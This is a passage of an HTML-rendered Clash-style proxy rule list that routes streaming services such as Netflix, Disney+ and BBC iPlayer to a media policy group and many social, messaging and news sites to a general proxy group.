AbemaTV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,AbemaTV*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,abema.io,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,ameba.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,abema.tv,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hayabusa.io,GlobalMedia</span><br><span class="line">- DOMAIN,abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,ds-linear-abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,ds-vod-abematv.akamaized.net,GlobalMedia</span><br><span class="line">- DOMAIN,linear-abematv.akamaized.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Amazon Prime Video</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,InstantVideo.US*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Prime%20Video*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,aiv-cdn.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,aiv-delivery.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,amazonvideo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,primevideo.com,GlobalMedia</span><br><span class="line">- DOMAIN,avodmp4s3ww-a.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,d25xi40x97liuc.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,dmqdd6hw24ucf.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,d22qjgkvxw22r6.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,d1v5ir2lpwr8os.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,avoddashs,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Bahamut</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Anime*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bahamut.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,gamer.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN,gamer-cds.cdn.hinet.net,GlobalMedia</span><br><span class="line">- DOMAIN,gamer2-cds.cdn.hinet.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; BBC iPlayer</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,BBCiPlayer*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bbc.co.uk,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,bbci.co.uk,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,bbcfmt,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,uk-live,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; DAZN</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,DAZN*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,dazn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dazn-api.com,GlobalMedia</span><br><span class="line">- DOMAIN,d151l6v8er5bdm.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN-KEYWORD,voddazn,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Disney+</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Disney+*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,bamgrid.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,disney-plus.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,disneyplus.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,dssott.com,GlobalMedia</span><br><span class="line">- DOMAIN,cdn.registerdisney.go.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; encoreTVB</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,encoreTVB*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,encoretvb.com,GlobalMedia</span><br><span class="line">- DOMAIN,edge.api.brightcove.com,GlobalMedia</span><br><span class="line">- DOMAIN,bcbolt446c5271-a.akamaihd.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; FOX NOW</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,FOX%20NOW*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,fox.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,foxdcg.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,theplatform.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,uplynk.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HBO NOW</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HBO%20NOW*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,hbo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbogo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbonow.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; HBO GO HKG</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HBO%20GO%20PROD%20HKG*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,hbogoasia.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hbogoasia.hk,GlobalMedia</span><br><span class="line">- DOMAIN,bcbolthboa-a.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,players.brightcove.net,GlobalMedia</span><br><span class="line">- DOMAIN,s3-ap-southeast-1.amazonaws.com,GlobalMedia</span><br><span class="line">- DOMAIN,dai3fd1oh325y.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,44wilhpljf.execute-api.ap-southeast-1.amazonaws.com,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia1-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia2-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia3-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia4-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,hboasia5-i.akamaihd.net,GlobalMedia</span><br><span class="line">- DOMAIN,cf-images.ap-southeast-1.prod.boltdns.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 华文电视</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,HWTVMobile*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,5itv.tv,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,ocnttv.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Hulu</span></span><br><span class="line">- DOMAIN-SUFFIX,hulu.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,huluim.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hulustream.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Hulu(フールー)</span></span><br><span class="line">- DOMAIN-SUFFIX,happyon.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,hulu.jp,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ITV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,ITV_Player*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,itv.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,itvstatic.com,GlobalMedia</span><br><span class="line">- DOMAIN,itvpnpmobile-a.akamaihd.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; KKTV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,KKTV*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,com.kktv.ios.kktv*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,kktv.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,kktv.me,GlobalMedia</span><br><span class="line">- DOMAIN,kktv-theater.kk.stream,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Line TV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,LINE%20TV*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,linetv.tw,GlobalMedia</span><br><span class="line">- DOMAIN,d3c7rimkq79yfu.cloudfront.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; LiTV</span></span><br><span class="line">- DOMAIN-SUFFIX,litv.tv,GlobalMedia</span><br><span class="line">- DOMAIN,litvfreemobile-hichannel.cdn.hinet.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; My5</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,My5*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,channel5.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,my5.tv,GlobalMedia</span><br><span class="line">- DOMAIN,d349g9zuie06uo.cloudfront.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; myTV SUPER</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,mytv*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,mytvsuper.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,tvb.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Netflix</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Argo*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,fast.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflix.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflix.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nflxext.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nflximg.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nflximg.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nflxso.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nflxvideo.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest0.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest1.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest2.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest3.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest4.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest5.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest6.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest7.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest8.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,netflixdnstest9.com,GlobalMedia</span><br><span class="line">- IP-CIDR,23.246.0.0/18,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,37.77.184.0/21,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,45.57.0.0/17,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,64.120.128.0/17,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,66.197.128.0/17,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,108.175.32.0/20,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,192.173.64.0/18,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,198.38.96.0/19,GlobalMedia,no-resolve</span><br><span class="line">- IP-CIDR,198.45.48.0/20,GlobalMedia,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; niconico</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Niconico*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,dmc.nico,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nicovideo.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,nimg.jp,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,socdm.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; PBS</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,PBS*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,pbs.org,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Pornhub</span></span><br><span class="line">- DOMAIN-SUFFIX,phncdn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,phprcdn.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,pornhub.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,pornhubpremium.com,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 台湾好</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,TaiwanGood*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,skyking.com.tw,GlobalMedia</span><br><span class="line">- DOMAIN,hamifans.emome.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Twitch</span></span><br><span class="line">- DOMAIN-SUFFIX,twitch.tv,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,twitchcdn.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,ttvnw.net,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,jtvnw.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; ViuTV</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,Viu*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,ViuTV*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,viu.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,viu.tv,GlobalMedia</span><br><span class="line">- DOMAIN,api.viu.now.com,GlobalMedia</span><br><span class="line">- DOMAIN,d1k2us671qcoau.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,d2anahhhmp1ffz.cloudfront.net,GlobalMedia</span><br><span class="line">- DOMAIN,dfp6rglgjqszk.cloudfront.net,GlobalMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; YouTube</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,com.google.ios.youtube*,GlobalMedia</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,YouTube*,GlobalMedia</span></span><br><span class="line">- DOMAIN-SUFFIX,googlevideo.com,GlobalMedia</span><br><span class="line">- DOMAIN-SUFFIX,youtube.com,GlobalMedia</span><br><span class="line">- DOMAIN,youtubei.googleapis.com,GlobalMedia</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(HKMTMedia)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; 愛奇藝台灣站</span></span><br><span class="line">- DOMAIN,cache.video.iqiyi.com,HKMTMedia</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; bilibili</span></span><br><span class="line">- DOMAIN-SUFFIX,bilibili.com,HKMTMedia</span><br><span class="line">- DOMAIN,upos-hz-mirrorakam.akamaized.net,HKMTMedia</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">(DNS Cache Pollution Protection)</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Google</span></span><br><span class="line">- DOMAIN-SUFFIX,ampproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,appspot.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blogger.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,getoutline.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gvt0.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gvt1.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gvt3.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xn--ngstr-lra8j.com,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,google,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,blogspot,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Microsoft</span></span><br><span class="line">- DOMAIN-SUFFIX,onedrive.live.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,xboxlive.com,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Facebook</span></span><br><span class="line">- DOMAIN-SUFFIX,v2raytech.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hijk.art,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hijk.pw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,hijk.pp.ua,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cdninstagram.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fb.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fb.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fbaddins.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fbcdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fbsbx.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,fbworkmail.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,instagram.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,m.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,messenger.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,oculus.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,oculuscdn.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,rocksdb.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whatsapp.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,whatsapp.net,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,facebook,PROXY</span><br><span class="line">- IP-CIDR,3.123.36.126/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,35.157.215.84/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,35.157.217.255/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,52.58.209.134/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,54.93.124.31/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,54.162.243.80/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,54.173.34.141/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,54.235.23.242/32,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,169.45.248.118/32,PROXY,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Twitter</span></span><br><span class="line">- DOMAIN-SUFFIX,pscp.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,periscope.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,t.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,twimg.co,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,twimg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,twitpic.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,vine.co,PROXY</span><br><span class="line">- DOMAIN-KEYWORD,twitter,PROXY</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Telegram</span></span><br><span class="line">- DOMAIN-SUFFIX,t.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tlanyan.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,tdesktop.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telegra.ph,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telegram.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telegram.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,telesco.pe,PROXY</span><br><span class="line">- IP-CIDR,91.108.4.0/22,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,91.108.8.0/22,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,91.108.12.0/22,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,91.108.16.0/22,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,91.108.56.0/22,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,149.154.160.0/20,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,2001:b28:f23d::/48,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,2001:b28:f23f::/48,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,2001:67c:4e8::/48,PROXY,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Line</span></span><br><span class="line">- DOMAIN-SUFFIX,line.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,line-apps.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,line-scdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,naver.jp,PROXY</span><br><span class="line">- IP-CIDR,103.2.30.0/23,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,125.209.208.0/20,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,147.92.128.0/17,PROXY,no-resolve</span><br><span class="line">- IP-CIDR,203.104.144.0/21,PROXY,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Other</span></span><br><span class="line">- DOMAIN-SUFFIX,4shared.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,520cc.cc,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,881903.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,9cache.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,9gag.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,abc.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,abc.net.au,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,abebooks.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,amazon.co.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apigee.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apk-dl.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apkfind.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apkmirror.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apkmonk.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,apkpure.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,aptoide.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,archive.is,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,archive.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,arte.tv,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,artstation.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,arukas.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ask.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,avg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,avgle.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,badoo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bandwagonhost.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bbc.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,behance.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bibox.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,biggo.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,binance.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bitcointalk.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bitfinex.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bitmex.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bit-z.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bloglovin.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bloomberg.cn,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bloomberg.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,blubrry.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,book.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,booklive.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,books.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,boslife.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,box.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,businessinsider.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,bwh1.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,castbox.fm,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cbc.ca,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cdw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,change.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,channelnewsasia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ck101.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,clarionproject.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,clyp.it,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cna.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,comparitech.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,conoha.jp,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,crucial.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cts.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cw.com.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,cyberctm.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dailymotion.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dailyview.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,daum.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,daumcdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dcard.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,deepdiscount.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,depositphotos.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,deviantart.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,disconnect.me,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discordapp.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,discordapp.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,disqus.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dlercloud.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dns2go.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dowjones.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dropbox.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dropboxusercontent.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,duckduckgo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dw.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,dynu.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,earthcam.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ebookservice.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,economist.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,edgecastcdn.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,edu,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,elpais.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,enanyang.my,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,encyclopedia.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,esoir.be,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,etherscan.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,euronews.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,evozi.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,feedly.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,firech.at,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flickr.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,flitto.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,foreignpolicy.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,freebrowser.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,freewechat.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,freeweibo.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,friday.tw,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ftchinese.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,ftimg.net,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,gate.io,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,getlantern.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,getsync.com,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,globalvoices.org,PROXY</span><br><span class="line">- DOMAIN-SUFFIX,goo.ne.jp,PROXY</span><br><span class="line">- 